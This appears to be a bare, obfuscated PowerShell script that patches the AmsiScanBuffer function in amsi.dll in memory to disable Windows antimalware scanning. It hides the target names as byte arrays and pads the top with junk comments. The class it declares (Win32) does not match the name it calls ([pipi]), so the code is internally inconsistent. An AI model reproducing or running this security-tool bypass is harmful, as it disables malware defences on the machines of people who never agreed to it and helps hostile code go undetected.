# oqiwdhoqihwdoqiwdoijefoalwioerhfoaiehrg
# oqiwdhowejfwe ewfo wefwef wef wenoowef ownef qihwdoqiwdoijefoalwioerhfoaiehrg
# oqiwdhoqihwdoqiwdoijefwelfkjhwoefhowefew fwef wefoalwioerhfoaiehrg
# oqiwdhoqihwdoqiwkwejhf welkkjfh wlkejflkwej fwdoijefoalwioerhfoaiehrg
# oqiwdhoqihwdoqiwwewjegfwefdoijefoalwioerhfoaiehrg
# oqiwdhoqihwdoqiwdoijef wefjwe fwoef wefijwoe  wefwe fwe oalwioerhfoaiehrg
$pipi = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@
Add-Type $pipi
$hhhhhhhhhhweflwkef2345 = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$oiwehfowhefowheofhwoeifhjowiejfowiejfow = [pipi]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($hhhhhhhhhhweflwkef2345))
$bloop = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$yooooooooooooo = [pipi]::GetProcAddress($oiwehfowhefowheofhwoeifhjowiejfowiejfow, [System.Text.Encoding]::ASCII.GetString($bloop))
$opaweihrfoawhefohwopeifhjpoiwef = 0
[pipi]::VirtualProtect($yooooooooooooo, [uint32]5, 0x40, [ref]$opaweihrfoawhefohwopeifhjpoiwef)
$yoloooooooooooooooowoeifh = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($yoloooooooooooooooowoeifh, 0, $yooooooooooooo, $yoloooooooooooooooowoeifh.Length)
